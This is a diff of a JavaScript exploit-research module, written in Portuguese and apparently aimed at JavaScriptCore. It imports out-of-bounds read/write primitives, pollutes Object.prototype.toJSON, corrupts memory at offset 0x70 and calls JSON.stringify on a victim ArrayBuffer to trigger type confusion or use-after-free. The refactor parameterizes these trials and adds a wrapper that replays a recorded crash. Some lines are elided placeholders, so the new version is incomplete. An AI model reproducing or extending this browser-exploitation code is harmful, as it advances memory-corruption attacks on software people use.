@@ -2,147 +2,132 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
 import {
-    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
-    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
+    triggerOOB_primitive, oob_array_buffer_real,
+    oob_write_absolute, clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs'; // Adicionado KNOWN_STRUCTURE_IDS
+import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';
 
-// --- Configuração Padrão para este Teste Específico ---
-// Você pode alterar esses valores ao chamar a função principal
-const DEFAULT_SPECULATIVE_TEST_CONFIG = {
-    victim_ab_size: 64,
-    // O offset e valor que causaram o crash no seu log
-    corruption_offset: 0x70, // Offset absoluto DENTRO do oob_array_buffer_real
-    value_to_write: 0xFFFFFFFF,
-    bytes_to_write_for_corruption: 4, // Geralmente StructureIDs ou flags são 32-bit
-    ppKey: 'toJSON',
-    enablePrototypePollution: true,
-    enableOOBWrite: true,
-    iterationName: "DefaultIteration", // Para identificar a configuração do teste no log
-};
-// --- Fim da Configuração Padrão ---
+// Função interna que executa uma única combinação de teste
+async function executeSingleJsonTCTest(
+    description, // Adicionando uma descrição para o log
+    corruption_offset, 
+    value_to_write, 
+    enable_pp, 
+    attemptOOBWrite, // Novo parâmetro para controlar a escrita OOB
+    skipOOBEnvironmentSetup, // Novo parâmetro para pular completamente o triggerOOB_primitive
+    logFn = logS3
+) {
+    const FNAME_SINGLE_TEST = `executeSingleJsonTCTest<${description}>`;
+    logFn(`--- Iniciando Teste Especulativo: ${description} ---`, "test", FNAME_SINGLE_TEST);
+    logFn(`   Offset Corrupção: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, PP: ${enable_pp}, Escrita OOB: ${attemptOOBWrite}, Setup OOB: ${!skipOOBEnvironmentSetup}`, "info", FNAME_SINGLE_TEST);
 
-export async function testJsonTypeConfusionUAFSpeculative(testIterationConfig = {}) {
-    const FNAME = "testJsonTypeConfusionUAFSpeculative";
-
-    // Mescla a configuração padrão com a configuração da iteração fornecida
-    const currentConfig = { ...DEFAULT_SPECULATIVE_TEST_CONFIG, ...testIterationConfig };
-
-    logS3(`--- Iniciando Teste Especulativo UAF/Type Confusion via JSON (S3) ---`, "test", `${FNAME} (${currentConfig.iterationName})`);
-    logS3(`   Config: victim_size=${currentConfig.victim_ab_size}, ppKey=${currentConfig.ppKey}`, "info", FNAME);
-    logS3(`   PP Habilitada: ${currentConfig.enablePrototypePollution}, Escrita OOB Habilitada: ${currentConfig.enableOOBWrite}`, "info", FNAME);
-    if (currentConfig.enableOOBWrite) {
-        logS3(`   OOB: offset=${toHex(currentConfig.corruption_offset)}, valor=${toHex(currentConfig.value_to_write)}, size=${currentConfig.bytes_to_write_for_corruption}B`, "info", FNAME);
+    if (!skipOOBEnvironmentSetup) {
+        await triggerOOB_primitive(); // Configura o ambiente OOB
+        if (!oob_array_buffer_real) {
+            logFn("Falha ao configurar ambiente OOB. Abortando este teste.", "error", FNAME_SINGLE_TEST);
+            return false;
+        }
+    } else {
+        logFn("Setup do ambiente OOB pulado para este teste.", "info", FNAME_SINGLE_TEST);
+        // Garantir que o ambiente OOB esteja limpo se não for usado
+        if (oob_array_buffer_real) clearOOBEnvironment();
     }
 
-    let testSuccessfulDueToCrashOrError = false;
 
-    await triggerOOB_primitive();
-    if (!oob_array_buffer_real) {
-        logS3("Falha ao configurar ambiente OOB. Abortando esta iteração.", "error", FNAME);
-        return false;
-    }
+    let victim_ab_size = 64;
+    let victim_ab = new ArrayBuffer(victim_ab_size);
+    logFn(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_SINGLE_TEST);
 
-    let victim_ab = new ArrayBuffer(currentConfig.victim_ab_size);
-    logS3(`ArrayBuffer vítima (${currentConfig.victim_ab_size} bytes) recriado para esta iteração.`, "info", FNAME);
-
-    const ppKey = currentConfig.ppKey;
-    let originalToJSONDescriptor = null;
-    if (currentConfig.enablePrototypePollution) {
-        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-    }
-    let pollutionActuallyApplied = false;
+    const ppKey = 'toJSON';
+    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+    let pollutionApplied = false;
+    let testSucceededSpeculatively = false;
 
     try {
-        if (currentConfig.enablePrototypePollution) {
-            logS3(`Tentando poluir Object.prototype.${ppKey}`, "info", FNAME);
+        if (enable_pp) {
+            logFn(`Tentando poluir Object.prototype.${ppKey}...`, "info", FNAME_SINGLE_TEST);
             Object.defineProperty(Object.prototype, ppKey, {
                 value: function() {
+                    // ... (código da função toJSON poluída - manter como estava, mas adicionar logs)
                     const currentOperationThis = this;
-                    logS3(`[${ppKey} Poluído - ${currentConfig.iterationName}] Chamado!`, "vuln", FNAME);
-                    logS3(`  typeof this: ${typeof currentOperationThis}`, "info", FNAME);
-                    logS3(`  this instanceof ArrayBuffer: ${currentOperationThis instanceof ArrayBuffer}`, "info", FNAME);
-                    // ... (outros logs sobre 'this' como no seu original) ...
+                    logFn(`[[[ ${ppKey} POLUÍDO INVOCADO ]]]`, 'vuln', FNAME_SINGLE_TEST); // Log de entrada
+                    // ... (resto dos logs e lógica da função toJSON) ...
                     try {
-                        logS3(`  this.constructor.name: ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME);
+                        // ... (acessos a currentOperationThis.byteLength, etc.)
+                        logFn(`  [[[ ${ppKey} POLUÍDO FINALIZANDO NORMALMENTE ]]]`, 'info', FNAME_SINGLE_TEST);
+                        return { toJSON_executed: true, /* ... */ };
                     } catch (e) {
-                        logS3(`  Erro ao acessar this.constructor.name: ${e.message}`, "warn", FNAME);
-                    }
-                    logS3(`  Object.prototype.toString.call(this): ${Object.prototype.toString.call(currentOperationThis)}`, "info", FNAME);
-
-                    let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
-                    try {
-                        details.byteLength = currentOperationThis.byteLength; // Pode crashar aqui
-                        if (typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4) {
-                             let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
-                             let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : (currentOperationThis.byteOffset || 0);
-                             if (bufferToView && bufferToView.byteLength >= offsetInView + 4) {
-                                details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
-                             }
-                        }
-                        details.slice_exists = (typeof currentOperationThis.slice === 'function');
-                        logS3(`  Detalhes de 'this': byteLength=${details.byteLength}, 1stDword=${details.first_dword === "N/A" ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME);
-                        return { toJSON_executed: true, type: Object.prototype.toString.call(currentOperationThis), details: details };
-                    } catch (e_toJSON) {
-                        logS3(`  [${ppKey} Poluído - ${currentConfig.iterationName}] ERRO ao acessar props/métodos de 'this': ${e_toJSON.message}`, "critical", FNAME);
-                        logS3(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (config: ${currentConfig.iterationName})`, "vuln", FNAME);
-                        testSuccessfulDueToCrashOrError = true;
-                        return { toJSON_error: true, message: e_toJSON.message, type_at_error: Object.prototype.toString.call(currentOperationThis) };
+                        logFn(`  [[[ ${ppKey} POLUÍDO ERRO INTERNO: ${e.message} ]]]`, 'critical', FNAME_SINGLE_TEST);
+                        logFn(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (Teste: ${description})`, "vuln", FNAME_SINGLE_TEST);
+                        testSucceededSpeculatively = true;
+                        return { toJSON_error: true, /* ... */ };
                     }
                 },
-                writable: true,
-                configurable: true,
-                enumerable: false
+                writable: true, configurable: true, enumerable: false
             });
-            pollutionActuallyApplied = true;
-            logS3(`Object.prototype.${ppKey} poluído.`, "good", FNAME);
+            pollutionApplied = true;
+            logFn(`Object.prototype.${ppKey} poluído.`, "good", FNAME_SINGLE_TEST);
+        } else {
+            logFn(`Poluição de Object.prototype.${ppKey} DESABILITADA.`, "info", FNAME_SINGLE_TEST);
         }
 
-        if (currentConfig.enableOOBWrite) {
-            if (currentConfig.corruption_offset >= 0 && currentConfig.corruption_offset + currentConfig.bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
-                logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(currentConfig.value_to_write)} (${currentConfig.bytes_to_write_for_corruption} bytes) em offset absoluto ${toHex(currentConfig.corruption_offset)} do oob_array_buffer_real`, "warn", FNAME);
-                oob_write_absolute(currentConfig.corruption_offset, currentConfig.value_to_write, currentConfig.bytes_to_write_for_corruption);
+        if (attemptOOBWrite && !skipOOBEnvironmentSetup && oob_array_buffer_real) {
+            const bytes_to_write_for_corruption = 4;
+            if (corruption_offset >= 0 && corruption_offset + bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
+                logFn(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset absoluto ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME_SINGLE_TEST);
+                oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
             } else {
-                logS3(`AVISO: Offset de corrupção ${toHex(currentConfig.corruption_offset)} está fora dos limites de oob_array_buffer_real. Pulando escrita OOB.`, "warn", FNAME);
+                logFn(`AVISO: Offset de corrupção ${toHex(corruption_offset)} está fora dos limites de oob_array_buffer_real ou é negativo. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
             }
+        } else if (attemptOOBWrite) {
+            logFn(`AVISO: Escrita OOB solicitada, mas ambiente OOB não configurado ou buffer nulo. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST);
         }
 
-        await PAUSE_S3(SHORT_PAUSE_S3);
 
-        logS3(`Chamando JSON.stringify(victim_ab) (config: ${currentConfig.iterationName})...`, "info", FNAME);
+        await PAUSE_S3(MEDIUM_PAUSE_S3);
+
+        logFn(`>>> PRESTES A CHAMAR JSON.stringify(victim_ab) para teste: ${description}`, "info", FNAME_SINGLE_TEST);
         let stringifyResult = null;
         try {
             stringifyResult = JSON.stringify(victim_ab); // PONTO CRÍTICO
-            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME);
-            if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_error:true")) {
-                logS3("SUCESSO ESPECULATIVO CONFIRMADO: Erro capturado dentro do toJSON poluído.", "vuln", FNAME);
-                testSuccessfulDueToCrashOrError = true; // Já setado dentro do toJSON, mas reforça
-            } else if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_executed:true")) {
-                logS3("JSON.stringify executou toJSON poluído, mas sem erro interno aparente nesta chamada.", "good", FNAME);
-            }
-        } catch (e_stringify) {
-            logS3(`ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_stringify.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME);
-            logS3(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (config: ${currentConfig.iterationName})`, "vuln", FNAME);
-            console.error(`JSON.stringify UAF/TC Test Error (config: ${currentConfig.iterationName}):`, e_stringify);
-            testSuccessfulDueToCrashOrError = true;
+            logFn(`<<< RETORNO JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_SINGLE_TEST);
+            // ... (lógica de verificação do resultado como antes) ...
+        } catch (e) {
+            logFn(`ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME_SINGLE_TEST);
+            logFn(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (Teste: ${description})`, "vuln", FNAME_SINGLE_TEST);
+            console.error(`JSON.stringify UAF/TC Test Error (${description}):`, e);
+            testSucceededSpeculatively = true;
         }
 
     } catch (mainIterationError) {
-        logS3(`Erro na iteração do teste (config: ${currentConfig.iterationName}): ${mainIterationError.message}`, "error", FNAME);
+        logFn(`Erro principal na iteração do teste (${description}): ${mainIterationError.message}`, "error", FNAME_SINGLE_TEST);
         console.error(mainIterationError);
-        testSuccessfulDueToCrashOrError = true; // Um erro inesperado aqui também pode ser um sinal
     } finally {
-        if (pollutionActuallyApplied) {
+        if (pollutionApplied) {
             if (originalToJSONDescriptor) {
                 Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
             } else {
                 delete Object.prototype[ppKey];
             }
         }
-        clearOOBEnvironment();
-        logS3(`Iteração ${currentConfig.iterationName} concluída. (SucessoEspeculativoPorCrashOuErro: ${testSuccessfulDueToCrashOrError})`, "info", FNAME);
+        if (!skipOOBEnvironmentSetup && oob_array_buffer_real) {
+            clearOOBEnvironment();
+        }
     }
+    logFn(`--- Teste Especulativo Concluído: ${description} (Sucesso Especulativo: ${testSucceededSpeculatively}) ---`, "test", FNAME_SINGLE_TEST);
+    return testSucceededSpeculatively;
+}
 
-    logS3(`--- Teste Especulativo UAF/Type Confusion via JSON (S3) (config: ${currentConfig.iterationName}) Concluído ---`, "test", FNAME);
-    return testSuccessfulDueToCrashOrError;
+// Função exportada para rodar um teste específico
+export async function runSpecificJsonTypeConfusionTest(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, skipOOBEnvSetup = false) {
+    return await executeSingleJsonTCTest(description, corruptionOffset, valueToWrite, enablePP, attemptOOBWrite, skipOOBEnvSetup, logS3);
+}
+
+// Função original, agora serve como um loop de varredura mais amplo se chamada diretamente
+export async function testJsonTypeConfusionUAFSpeculative() {
+    // ... (esta função pode permanecer como um exemplo de varredura, ou você pode removê-la/adaptá-la
+    // para chamar runSpecificJsonTypeConfusionTest com diferentes combinações em loop) ...
+    logS3("Executando testJsonTypeConfusionUAFSpeculative (loop original) - considere usar runSpecificJsonTypeConfusionTest para testes focados.", "warn");
+    // Exemplo: replicando o crash original
+    await runSpecificJsonTypeConfusionTest("ScanOriginalCrash", 0x70, 0xFFFFFFFF, true, true, false);
 }
